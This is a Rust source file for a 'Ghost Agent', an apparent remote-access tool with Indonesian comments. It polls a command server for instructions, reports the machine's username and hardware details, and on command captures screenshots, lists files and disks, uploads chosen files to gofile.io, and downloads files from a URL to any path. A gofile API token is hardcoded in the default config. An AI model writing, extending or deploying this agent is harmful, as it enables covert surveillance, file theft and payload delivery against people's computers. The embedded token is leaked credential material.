use std::fs;
use std::io::Write;
use std::path::Path;
use std::time::Duration;
use tokio::time::sleep;
use serde::{Deserialize, Serialize};
use sysinfo::{System, SystemExt, DiskExt, CpuExt}; // Tambahkan DiskExt & CpuExt
use reqwest::Client;
use screenshots::Screen;
use uuid::Uuid;
use base64::{Engine as _, engine::general_purpose}; // Fix base64 deprecated

// --- CONFIGURATION STRUCT ---
// Fix: Tambahkan 'Serialize' agar bisa disimpan kembali ke JSON
#[derive(Serialize, Deserialize, Clone)]
struct Config {
    api_url: String,
    device_name: String,
    heartbeat_interval_ms: u64,
    poll_interval_ms: u64,
    gofile_token: String,
    #[serde(default)]
    device_id: String,
}

// --- PAYLOAD STRUCTS ---
#[derive(Serialize)]
struct HeartbeatPayload {
    action: String,
    device_id: String,
    device_name: String,
    ram_usage: u64, // in MB
    ram_total: u64, // in MB
    cpu_usage: f32, // fraction 0.0-100.0
    cpu_brand: String,
    platform: String,
    os_type: String,
    user: String,
}

#[derive(Serialize)]
struct CommandResponse {
    action: String,
    device_id: String,
    reply_to_id: String,
    status: String,
    data: Option<serde_json::Value>,
}

#[derive(Deserialize)]
struct PendingCommand {
    messageId: String,
    command: String,
    args: Option<String>,
}

#[derive(Serialize)]
struct FileEntry {
    name: String,
    kind: String,
    size: String,
}

// --- MAIN LOGIC ---

#[tokio::main]
async fn main() {
    println!("👻 Ghost Agent v2.1 - Enhanced Status Active...");

    let mut config = load_or_create_config();
    println!("📱 Device ID: {}", config.device_id);
    
    let client = Client::builder().build().unwrap();

    // 2. Spawn Heartbeat Task
    let hb_config = config.clone();
    let hb_client = client.clone();
    
    tokio::spawn(async move {
        let mut sys = System::new_all();
        loop {
            sys.refresh_memory();
            sys.refresh_cpu();
            
            let cpu_brand = sys.global_cpu_info().brand().to_string();
            let cpu_usage = sys.global_cpu_info().cpu_usage();
            
            let payload = HeartbeatPayload {
                action: "heartbeat".to_string(),
                device_id: hb_config.device_id.clone(),
                device_name: hb_config.device_name.clone(),
                ram_usage: sys.used_memory() / 1024 / 1024,
                ram_total: sys.total_memory() / 1024 / 1024,
                cpu_usage,
                cpu_brand,
                platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
                os_type: sys.distribution_id(),
                user: whoami::username(),
            };

            let _ = hb_client.post(&hb_config.api_url).json(&payload).send().await;
            sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
        }
    });

    // 3. Command Polling Loop
    loop {
        match fetch_command(&client, &config).await {
            Ok(Some(cmd)) => {
                println!("📩 Command: {} Args: {:?}", cmd.command, cmd.args);
                process_command(&client, &config, cmd).await;
            }
            Err(e) => println!("⚠️ Poll Error: {}", e),
            _ => {}
        }
        sleep(Duration::from_millis(config.poll_interval_ms)).await;
    }
}

// --- UTILS ---

fn load_or_create_config() -> Config {
    let path = "config.json";
    let (mut cfg, is_new) = if Path::new(path).exists() {
        let content = fs::read_to_string(path).unwrap();
        (serde_json::from_str::<Config>(&content).unwrap_or_else(|_| {
            println!("⚠️ Config rusak, reset...");
            create_default_config(path)
        }), false)
    } else {
        (create_default_config(path), true)
    };

    // Auto-generate Device ID if missing (and it's not a newly created config which already has one)
    if !is_new && cfg.device_id.is_empty() {
        cfg.device_id = Uuid::new_v4().to_string();
        save_config(path, &cfg);
        println!("🆔 Generated and saved new Device ID: {}", cfg.device_id);
    }

    // 🚀 AUTO-ADAPT: Switch to localhost if in development (debug mode)
    if cfg!(debug_assertions) {
        println!("🛠️  [DEV MODE] Auto-switching API to http://localhost:3000/api/ghost");
        cfg.api_url = "http://localhost:3000/api/ghost".to_string();
    } else {
        println!("🌐 [RELEASE MODE] Connecting to: {}", cfg.api_url);
    }
    
    cfg
}

fn create_default_config(path: &str) -> Config {
    let username = whoami::username();
    let devicename = whoami::devicename();
    
    let default_cfg = Config {
        api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
        device_name: format!("{}-{}", username, devicename),
        heartbeat_interval_ms: 5000,
        poll_interval_ms: 2000,
        gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
        device_id: Uuid::new_v4().to_string(),
    };

    save_config(path, &default_cfg);
    default_cfg
}

fn save_config(path: &str, config: &Config) {
    let json = serde_json::to_string_pretty(config).unwrap();
    let mut file = fs::File::create(path).expect("Gagal membuat file config");
    file.write_all(json.as_bytes()).expect("Gagal menulis config");
}

async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
    let url = format!("{}?deviceId={}", config.api_url, config.device_id);
    let resp = client.get(&url).send().await?;
    
    if resp.status().is_success() {
        let text = resp.text().await?;
        if text.trim().is_empty() || text == "null" { return Ok(None); }
        if let Ok(cmd) = serde_json::from_str::<PendingCommand>(&text) {
            return Ok(Some(cmd));
        }
    }
    Ok(None)
}

async fn process_command(client: &Client, config: &Config, cmd: PendingCommand) {
    let mut response_data: Option<serde_json::Value> = None;
    let mut status = "DONE".to_string();

    match cmd.command.as_str() {
        "LS" => {
            let path_str = cmd.args.unwrap_or_else(|| "C:\\".to_string());
            let path = Path::new(&path_str);
            
            if !path.exists() {
                status = "ERROR".to_string();
                response_data = Some(serde_json::json!({ "message": "Path not found" }));
            } else {
                match fs::read_dir(path) {
                    Ok(entries) => {
                        let mut files: Vec<FileEntry> = Vec::new();
                        for entry in entries {
                            if let Ok(entry) = entry {
                                let name = entry.file_name().to_string_lossy().to_string();
                                // Gunakan metadata() dengan aman
                                if let Ok(meta) = entry.metadata() {
                                    files.push(FileEntry {
                                        name,
                                        kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
                                        size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
                                    });
                                } else {
                                    // Jika metadata gagal (misal file sistem khusus), masukkan sebagai unknown
                                    files.push(FileEntry { name, kind: "unknown".to_string(), size: "?".to_string() });
                                }
                            }
                        }
                        files.sort_by(|a, b| {
                            if a.kind == b.kind { a.name.cmp(&b.name) } 
                            else if a.kind == "dir" { std::cmp::Ordering::Less } 
                            else { std::cmp::Ordering::Greater }
                        });
                        response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                    }
                    Err(e) => {
                        status = "ERROR".to_string();
                        response_data = Some(serde_json::json!({ "message": format!("Access Denied: {}", e) }));
                    }
                }
            }
        },
        "SCREENSHOT" => {
            let screens = Screen::all().unwrap_or_default();
            if let Some(screen) = screens.first() {
                match screen.capture() {
                    Ok(image) => {
                        let mut cursor = std::io::Cursor::new(Vec::new());
                        let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
                        
                        let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                        response_data = Some(serde_json::json!({ "image": b64 }));
                    },
                    Err(e) => {
                        status = "ERROR".to_string();
                        response_data = Some(serde_json::json!({ "message": e.to_string() }));
                    }
                }
            }
        },
        "LIST_DISKS" => {
            let mut sys = System::new_all();
            sys.refresh_disks_list();
            sys.refresh_disks();
            
            let mut disks: Vec<serde_json::Value> = Vec::new();
            for disk in sys.disks() {
                disks.push(serde_json::json!({
                    "name": disk.name().to_string_lossy().to_string(),
                    "mount_point": disk.mount_point().to_string_lossy().to_string(),
                    "total_space": format_size(disk.total_space()),
                    "available_space": format_size(disk.available_space()),
                    "file_system": String::from_utf8_lossy(disk.file_system()).to_string(),
                }));
            }
            response_data = Some(serde_json::json!({ "disks": disks }));
        },
        "GET_FILE" => {
            let path_str = cmd.args.unwrap_or_default();
            match upload_to_gofile(client, &path_str, &config.gofile_token).await {
                Ok(url) => response_data = Some(serde_json::json!({ "url": url })),
                Err(e) => {
                    status = "ERROR".to_string();
                    response_data = Some(serde_json::json!({ "message": e.to_string() }));
                }
            }
        },
        "PUT_FILE" => {
            // Args expected: { "url": "...", "dest": "..." }
            if let Some(args_str) = cmd.args {
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&args_str) {
                    let url = json["url"].as_str().unwrap_or_default();
                    let dest = json["dest"].as_str().unwrap_or_default();
                    
                    if !url.is_empty() && !dest.is_empty() {
                         match client.get(url).send().await {
                             Ok(resp) => {
                                 if resp.status().is_success() {
                                     match resp.bytes().await {
                                         Ok(bytes) => {
                                             if bytes.is_empty() {
                                                 status = "ERROR".to_string();
                                                 response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
                                             } else if let Err(e) = std::fs::write(dest, bytes) {
                                                 status = "ERROR".to_string();
                                                 response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
                                             }
                                         },
                                         Err(e) => {
                                             status = "ERROR".to_string();
                                             response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
                                         }
                                     }
                                 } else {
                                     status = "ERROR".to_string();
                                     response_data = Some(serde_json::json!({ "message": format!("Download failed (HTTP {}): The URL might have expired or is not a direct link.", resp.status()) }));
                                 }
                             },
                             Err(e) => {
                                 status = "ERROR".to_string();
                                 response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
                             }
                         }
                    }
                }
            }
        }
        _ => {
            status = "ERROR".to_string();
            response_data = Some(serde_json::json!({ "message": "Unknown command" }));
        }
    }

    let payload = CommandResponse {
        action: "response".to_string(),
        device_id: config.device_id.clone(),
        reply_to_id: cmd.messageId,
        status,
        data: response_data,
    };

    let _ = client.post(&config.api_url).json(&payload).send().await;
}

fn format_size(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["B", "KB", "MB", "GB"];
    let mut b = bytes as f64;
    let mut i = 0;
    while b >= 1024.0 && i < UNITS.len() - 1 {
        b /= 1024.0;
        i += 1;
    }
    format!("{:.2} {}", b, UNITS[i])
}

async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Fix: tokio_util sekarang sudah diimport di Cargo.toml
    use tokio_util::codec::{BytesCodec, FramedRead};
    use tokio::fs::File;
    
    let path = Path::new(file_path);
    if !path.exists() { return Err("File not found".into()); }

    let file = File::open(file_path).await?;
    let stream = FramedRead::new(file, BytesCodec::new());
    let file_body = reqwest::Body::wrap_stream(stream);
    let filename = path.file_name().unwrap().to_string_lossy().to_string();

    let form = reqwest::multipart::Form::new()
        .part("file", reqwest::multipart::Part::stream(file_body).file_name(filename));

    let upload_resp = client.post("https://upload-ap-sgp.gofile.io/uploadFile")
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await?;

    let json: serde_json::Value = upload_resp.json().await?;
    
    if json["status"].as_str().unwrap_or("") == "ok" {
        Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
    } else {
        Err(format!("Gofile error: {:?}", json).into())
    }
}